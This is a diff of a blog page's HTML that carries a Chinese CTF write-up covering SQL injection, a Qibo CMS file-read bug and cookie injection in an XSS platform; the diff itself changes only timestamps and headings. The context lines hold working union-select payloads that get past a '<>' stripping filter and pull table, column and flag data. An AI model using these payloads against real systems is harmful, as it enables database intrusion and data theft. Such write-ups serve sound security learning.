@@ -29,7 +29,7 @@
 <meta property="og:image" content="http://yoursite.com/img/ctf/baiductf2/6.png">
 <meta property="og:image" content="http://yoursite.com/img/ctf/baiductf2/7.png">
 <meta property="og:image" content="http://yoursite.com/img/ctf/baiductf2/8.png">
-<meta property="og:updated_time" content="2016-10-14T03:09:21.148Z">
+<meta property="og:updated_time" content="2016-10-14T03:18:19.317Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="baidu CTF 2">
 <meta name="twitter:description" content="WriteUp for Baidu on ichunqiu,9月10号">
@@ -310,7 +310,7 @@
       
           
         <h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p>查看源码，发现他会把执行的sql语句显示出来，在id=1后输入特殊字符进行测试，发现他会把&lt;&gt;符号替换为空字符，而且这一对符号要不能拆开，那么我们就可以利用&lt;&gt;符号来绕过了。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">id=1 o&lt;&gt;rder b&lt;&gt;y 3</div><div class="line">id=1 u&lt;&gt;nion s&lt;&gt;elect 1,2,3</div><div class="line">页面暴出了2的位置</div><div class="line">id=1 u&lt;&gt;nion s&lt;&gt;elect 1,databse(),3    查看数据库名称sqli</div><div class="line">id=1 u&lt;&gt;nion s&lt;&gt;elect 1,group_concat(table_name),3 fr&lt;&gt;om info&lt;&gt;rmation_schema.tables whe&lt;&gt;re table_schema='sqli'    查看所有表名，得到info</div><div class="line">id=1 u&lt;&gt;nion s&lt;&gt;elect 1,group_concat(column_name),3 fr&lt;&gt;om info&lt;&gt;rmation_schema.columns whe&lt;&gt;re table_name='info'    查看所有的列名，得到id,title,flAg_T5ZNdrm</div><div class="line">id=1 u&lt;&gt;nion s&lt;&gt;elect 1,flAg_T5ZNdrm,3 fr&lt;&gt;om info          得到flag</div></pre></td></tr></table></figure></p>
-<h1 id="再见cms"><a href="#再见cms" class="headerlink" title="再见cms"></a>再见cms</h1><p>这种题，首先要确定cms的类型，通过查下面备案号得知这是齐博cms，然后找对应的漏洞，这里我用wooyun-2014-080259<br><img src="/img/ctf/baiductf2/1.png" alt=""><br>用load_file读flag.php<br><img src="/img/ctf/baiductf2/2.png" alt=""><br>最后查看自己资料，flag就躺在那</p>
+<h2 id="再见cms"><a href="#再见cms" class="headerlink" title="再见cms"></a>再见cms</h2><p>这种题，首先要确定cms的类型，通过查下面备案号得知这是齐博cms，然后找对应的漏洞，这里我用wooyun-2014-080259<br><img src="/img/ctf/baiductf2/1.png" alt=""><br>用load_file读flag.php<br><img src="/img/ctf/baiductf2/2.png" alt=""><br>最后查看自己资料，flag就躺在那</p>
 <h2 id="XSS平台"><a href="#XSS平台" class="headerlink" title="XSS平台"></a>XSS平台</h2><p>登录抓包，把用户名改成数组，返回错误信息，从中得知该平台是基于tornado 编写的XSS平台<br><img src="/img/ctf/baiductf2/3.png" alt=""><br>找到了该套源码，<a href="https://github.com/r0ker/Rtiny-xss，审计代码，/rtiny/lock.py" target="_blank" rel="external">https://github.com/r0ker/Rtiny-xss，审计代码，/rtiny/lock.py</a> 存在注入漏洞<br><img src="/img/ctf/baiductf2/4.png" alt=""><br>cookie中的username存在注入，但是tornado的cookie是密文传输的，所以我们也要对payload进行加密。<br>基于tornado写了个生成cookie的脚本<br><img src="/img/ctf/baiductf2/5.png" alt=""><br>运行脚本，访问站点抓包取Cookie，注入 /lock<br><img src="/img/ctf/baiductf2/6.png" alt=""><br>注入后得到帐号密码，登录XSS平台，/file 提示flag路径<br><img src="/img/ctf/baiductf2/7.png" alt=""><br>文件不能直接访问，通过刚开始获取到的绝对路径，load_file获取flag，用substring 分段获取就能得到完整flag<br><img src="/img/ctf/baiductf2/8.png" alt=""></p>
 
       
@@ -323,7 +323,7 @@
         <p><span>本文标题:</span><a href="/2016/09/27/baidu-CTF-2/">baidu CTF 2</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">x-man</a></p>
         <p><span>发布时间:</span>2016-09-27, 19:23:11</p>
-        <p><span>最后更新:</span>2016-10-14, 11:09:21</p>
+        <p><span>最后更新:</span>2016-10-14, 11:18:19</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2016/09/27/baidu-CTF-2/" title="baidu CTF 2">http://yoursite.com/2016/09/27/baidu-CTF-2/</a>
             <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2016/09/27/baidu-CTF-2/　　作者: x-man" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
@@ -359,7 +359,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL"><span class="toc-number">1.</span> <span class="toc-text">SQL</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#再见cms"><span class="toc-number"></span> <span class="toc-text">再见cms</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS平台"><span class="toc-number">1.</span> <span class="toc-text">XSS平台</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL"><span class="toc-number">1.</span> <span class="toc-text">SQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#再见cms"><span class="toc-number">2.</span> <span class="toc-text">再见cms</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS平台"><span class="toc-number">3.</span> <span class="toc-text">XSS平台</span></a></li></ol>
         
     </div>
     <style>
